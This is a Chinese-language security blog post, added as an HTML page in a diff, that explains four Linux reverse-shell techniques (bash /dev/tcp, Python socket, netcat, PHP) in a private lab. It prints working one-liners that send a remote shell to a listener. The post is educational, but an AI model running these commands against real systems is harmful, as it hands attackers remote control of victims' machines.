@@ -1,0 +1,1735 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="c1ay">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="c1ay">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="信息安全技术博客">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Linux下几种反弹shell方法的总结与理解 · c1ay&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/naruto.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >c1ay&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Linux下几种反弹shell方法的总结与理解</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>c1ay's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Linux下几种反弹shell方法的总结与理解
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "反弹shell">反弹shell</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/07/17</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Linux下几种反弹shell方法的总结与理解"><a href="#Linux下几种反弹shell方法的总结与理解" class="headerlink" title="Linux下几种反弹shell方法的总结与理解"></a>Linux下几种反弹shell方法的总结与理解</h1><p><strong>之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法</strong><br><a id="more"></a></p>
+<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>CentOS 6.5：192.168.0.3</strong></p>
+<p><strong>kali2.0：192.168.0.4</strong></p>
+<h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p><strong>反弹shell命令如下：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p><strong>首先，使用nc在kali上监听端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180717/0DdE723LF1.png?imageslim" alt="mark"><br><strong>然后在CentOS6.5下输入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180717/B9l36f21h6.png?imageslim" alt="mark"><br><strong>可以看到shell成功反弹到了kali上面，可以执行命令</strong><br><img src="http://pic.c1imber.top/blog/180717/35JfJKF24L.png?imageslim" alt="mark"><br><strong>在解释这条反弹shell的命令原理之前，首先需要掌握几个点</strong></p>
+<p><strong>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下</strong></p>
+<pre><code>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;
+1 - stdout 代表标准输出,使用&gt;或&gt;&gt;
+2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;
+</code></pre><p><strong>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的</strong></p>
+<pre><code>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。
+当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符
+</code></pre><p><strong>也有师傅把&amp;这个符号解释为是取地址符号，学过C语言的小伙伴们都知道&amp;这个符号代表取地址符，在C++中&amp;符号还代表为引用，这样做是为了区分文件描述符和文件，比如查看一个不存在的文件，要把标准错误重定向到标准输出，如果直接<code>cat notexistfile 2&gt;1</code>的话，则会将1看作是一个文件，将标准错误输出输出到1这个文件里而不是标准输出,而&amp;的作用就是为了区分文件和文件描述符</strong><br><img src="http://pic.c1imber.top/blog/180717/9gLL6Ih539.png?imageslim" alt="mark"><br><strong>理解了上面这些知识，下面来解释一下这一条反弹shell的命令</strong></p>
+<p><strong>首先，<code>bash -i</code>代表在本地打开一个bash，然后就是<code>/dev/tcp/ip/port</code>， <code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上<code>/dev/tcp/ip/port</code>这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程</strong><br><img src="http://pic.c1imber.top/blog/180717/jA18Hi8L77.png?imageslim" alt="mark"><br><strong>在本地输入设备（键盘）输入命令，在本地看不到输入的内容，但是键盘输入的命令已经被输出到了远程，然后命令的执行结果或者错误也会被传到远程，查看远程，可以看到标准输出和标准错误输出都重定向到了远程</strong><br><img src="http://pic.c1imber.top/blog/180717/0g2Im6dj72.png?imageslim" alt="mark"><br><strong>下面在该命令后面加上<code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</strong><br><img src="http://pic.c1imber.top/blog/180717/Ad1dIgeg9K.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180717/iHaH464C61.png?imageslim" alt="mark"><br><strong>那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程</strong><br><img src="http://pic.c1imber.top/blog/180717/AeA8baLFEc.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180717/32KC81aH0J.png?imageslim" alt="mark"><br><strong>为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向</strong><br><img src="http://pic.c1imber.top/blog/180718/I9E4l0E31l.png?imageslim" alt="mark"></p>
+<p><strong>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port</code>后</strong></p>
+<p><img src="http://pic.c1imber.top/blog/180718/F38m9Hlg48.png?imageslim" alt="mark"></p>
+<p><strong>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>或者<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2</code>后</strong><br><img src="http://pic.c1imber.top/blog/180718/iG2h7i1g7D.png?imageslim" alt="mark"></p>
+<h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p><strong>使用python反弹，反弹shell命令如下：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure>
+<p><strong>首先，使用nc在kali上监听端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/H2IlCDa6j2.png?imageslim" alt="mark"><br><strong>在CentOS下使用python去反向连接，输入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/e7kde87mKE.png?imageslim" alt="mark"><br><strong>可以看到kali上成功反弹到了shell，可以执行一些命令</strong><br><img src="http://pic.c1imber.top/blog/180718/Ek7JD4eGeh.png?imageslim" alt="mark"><br><strong>在已经深入理解了第一种方法的原理后，下面来解释一下python反弹shell的原理</strong></p>
+<p><strong>首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3</strong></p>
+<p><img src="http://pic.c1imber.top/blog/180718/C2adcJcjIh.png?imageslim" alt="mark"></p>
+<p><strong>于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了</strong></p>
+<h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p><strong>使用nc反弹shell,需要的条件是被反弹shell的机器安装了nc，CentOS6.5安装nc方法如下</strong></p>
+<pre><code>1、下载安装
+wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download
+tar -zxvf netcat-0.7.1.tar.gz -C /usr/local
+cd /usr/local
+mv netcat-0.7.1 netcat
+cd /usr/local/netcat
+./configure
+make &amp;&amp; make install
+2、配置
+vim /etc/profile
+添加以下内容：
+# set  netcat path
+export NETCAT_HOME=/usr/local/netcat
+export PATH=$PATH:$NETCAT_HOME/bin
+保存，退出，并使配置生效：
+source /etc/profile
+3、测试
+nc -help成功
+</code></pre><p><img src="http://pic.c1imber.top/blog/180718/L3k8cCbd4I.png?imageslim" alt="mark"></p>
+<p><strong>之后在kali上使用nc监听端口</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/4JlKI8AAa8.png?imageslim" alt="mark"></p>
+<p><strong>在CentOS上使用nc去反向连接，命令如下：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash 192.168.0.4 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/lk26I81B39.png?imageslim" alt="mark"><br><strong>这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(<code>/bin/bash</code>)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令</strong><br><img src="http://pic.c1imber.top/blog/180718/G0j42BbeEI.png?imageslim" alt="mark"><br><strong>注意之前使用nc监听端口反弹shell时都会有一个警告：<code>Warning: forward host lookup failed for bogon: Unknown host</code>,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nlvp 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/bDJ9Ah33Lj.png?imageslim" alt="mark"></p>
+<p><strong>如果nc不支持-e参数的话，可以利用到linux中的管道符，首先在kali上开启监听</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 6666</div><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/6Gf87b2g0c.png?imageslim" alt="mark"><br><strong>之后在CentOS上使用nc去反向链接</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/8ab45ddDa8.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/iliCEIg5cL.png?imageslim" alt="mark"><br><strong>这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的<code>/bin/bash</code>，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口</strong><br><img src="http://pic.c1imber.top/blog/180718/bCG25adDFg.png?imageslim" alt="mark"></p>
+<h3 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h3><p><strong>使用php反弹shell，方法如下</strong><br><strong>首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1");'</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/AfJ3e8GI2i.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/Da1d5I1GgL.png?imageslim" alt="mark"><br><strong>还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/fmLfgB7mg1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/JbLmF1b3l9.png?imageslim" alt="mark"><br><strong>这个姿势看起来有一些难以理解，尤其是还出现了<code>&lt;&amp;</code>这个符号，当然如果把&amp;看着是取地址符或者是引用，那还是可以理解的，为了更方便的理解，我在这将这条命令稍微修改了一下，类似于前面的第二种方法</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><strong>有了之前的基础，我们知道3代表的是使用fsockopen函数建立socket返回的文件描述符，这里将标准输入，标准输出和标准错误输出都重定向到了远程</strong></p>
+<p><strong>在CentOS上反向连接，输入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/180718/1H1Ie6D8Hg.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/B0c9GjFmD5.png?imageslim" alt="mark"><br><strong>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</strong></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>写这篇文章加上查阅资料花了一天多的时间，感觉自己现在真正的将这四种方法理解透了，能够自己去写一些反弹shell的命令了，所以付出还是值得的，网上还有不少反弹shell的命令，以后自己会不断的补充，It’s the climb!</strong></p>
+<h3 id="有关反弹shell的一些不错的资料"><a href="#有关反弹shell的一些不错的资料" class="headerlink" title="有关反弹shell的一些不错的资料"></a>有关反弹shell的一些不错的资料</h3><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" title="Linux下反弹shell的种种方式 - r00tgrok - 博客园" target="_blank" rel="external"><strong>Linux下反弹shell的种种方式 - r00tgrok - 博客园</strong></a></p>
+<p><a href="https://www.anquanke.com/post/id/85712" title="Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体" target="_blank" rel="external"><strong>Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体</strong></a></p>
+<p><a href="https://www.cnblogs.com/jnxb/p/3940593.html" title="Linux nc命令用法收集 - 江南小碧 - 博客园" target="_blank" rel="external"><strong>Linux nc命令用法收集 - 江南小碧 - 博客园</strong></a></p>
+<p><a href="http://www.91ri.org/9367.html" title="Web渗透中的反弹Shell与端口转发的奇淫技巧" target="_blank" rel="external"><strong>Web渗透中的反弹Shell与端口转发的奇淫技巧</strong></a></p>
+<p><a href="https://blog.csdn.net/jlu16/article/details/78987990" title="辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解" target="_blank" rel="external"><strong>辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解</strong></a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2018/07/17/Linux下几种反弹shell方法的总结与理解/">https://c1aysec.github.io/2018/07/17/Linux下几种反弹shell方法的总结与理解/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2018/07/17/Linux下几种反弹shell方法的总结与理解/">July 17th 2018, 11:55:32 am</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2018/07/17/Linux下几种反弹shell方法的总结与理解/">December 19th 2018, 7:26:15 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/" title= "记一次漏洞组合拳-水平越权+Self XSS漏洞">
+                    <div class="nextTitle">记一次漏洞组合拳-水平越权+Self XSS漏洞</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/06/30/渗透技巧使用dnslog加快盲注速度/" title= "渗透技巧-使用dnslog加快盲注速度">
+                    <div class="prevTitle">渗透技巧-使用dnslog加快盲注速度</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1372003815@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/mywechat.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
